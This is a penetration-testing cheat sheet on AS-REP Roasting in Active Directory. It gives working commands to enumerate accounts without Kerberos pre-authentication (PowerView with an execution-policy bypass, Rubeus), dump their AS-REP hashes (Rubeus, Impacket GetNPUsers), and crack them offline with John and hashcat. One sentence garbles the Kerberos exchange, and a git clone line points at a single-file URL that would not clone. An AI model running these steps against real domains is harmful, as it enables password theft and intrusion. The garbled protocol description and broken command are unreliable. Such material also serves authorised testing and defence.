# AS-REP Roasting

The AS-REP Roasting technique enables attackers to acquire password hashes of user accounts that have **deactivated** Kerberos pre-authentication. This method entails transmitting an Authentication Server Request (AS-REQ) message to the domain controller (DC). If pre-authentication is disabled, the DC will return an AS-REP message containing encrypted data, including a segment encrypted with the user's password hash. Subsequently, the attacker can utilize this information to attempt cracking the user's password offline.

**AS-REP Roasting** is a technique used to exploit a weakness in the Kerberos authentication procotol.\
In the Kerberos protocol, when a user wants to authenticate to a service, they send an **Authentication Service request (AS-REQ)**  to the **Key Authentication Service reply (AS-REP)**, which includes a **ticket-granting ticket (TGT)**. The TGT is encrypted using the user's password hash.

AS-REP Roasting takes advantage of the fact that some user accounts in AD may have the "**Do not require Kerberos preauthentication**" option **enabled**. This option allows the AS-REP to be requested without the need for the user's password.

#### AS-REP Roasting Method:

* **Find vulnerable users** of the domain with tools
* Do a **AS-REP attack** to get user TGT
* **Crack** the TGT obtained earlier&#x20;

## Find vulnerable user

First we have to detect all user in the domain that has "**Do not require Kerberos preauthentication**" option **enabled**.

### Detect with PowerView

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

```powershell
# import powerview module
powershell -ep bypass
. .\PATH\TO\PowerView.ps1
```

{% code title="Detect with PowerView " %}
```powershell
Get-Domainuser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
Get-DomainUser -PreauthNotRequired -verbose
```
{% endcode %}

### Detect with Rubeus.exe

```powershell
.\Rubeus.exe asreproast
```



## AS-REP Attack

With this attack with can get the TGT of the vulnerable user.

### AS-REP with Rubeus.exe

{% embed url="https://github.com/GhostPack/Rubeus" %}

Transfer the executable into the target and run it with appropriate tag.

{% content-ref url="../../executive-pt/post-exploitation/trasferring-files.md" %}
[trasferring-files.md](../../executive-pt/post-exploitation/trasferring-files.md)
{% endcontent-ref %}

```powershell
.\Rubeus.exe asreproast /usr:$USER /outfile:tgthash.txt
.\Rubeus.exe asreproast /format:hashcat /outfile:tgthash.txt
```

### GetNPUsers.py

The **GetNPUsers.py** script from Impacket can be used to request a TGT ticket and dump the hash.

{% embed url="https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py" %}

Clone the script in your kali machine and use it with opportune flags.

```bash
git clone https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
```

```bash
GetNPUsers.py $DOMAIN_NAME.local/$USER -dc-ip $DC_IP -no-pass
```

```bash
impacket-GetNPUsers $DOMAIN/$USER -dc-ip $DC_IP -dc-host $DOMAIN -no-pass
```

Save the hash in the file and move on.

## Crack the TGT

Once we have a output file with TGT ticket of a user in the Domain, we can try to crack it with JtR or Hashcat.

{% code overflow="wrap" %}
```bash
john PATH/TO/$tgt_hash.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
```
{% endcode %}

```bash
john $tgt_hash.txt --fork=4 -w=/PATH/TO/rockyou.txt
```

```bash
hashcat -m 18200 --force -a 0 $tgt_hash.txt PASS_LIST.txt
```









